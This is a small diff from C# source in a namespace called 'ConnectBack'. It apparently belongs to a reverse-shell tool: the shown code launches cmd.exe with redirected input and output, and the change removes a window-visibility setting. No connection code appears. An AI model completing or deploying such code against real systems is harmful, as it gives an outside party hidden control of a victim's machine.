@@ -28,7 +28,6 @@ namespace ConnectBack
 
 						Process p = new Process();
 						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = false;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
 						p.StartInfo.RedirectStandardInput = true;
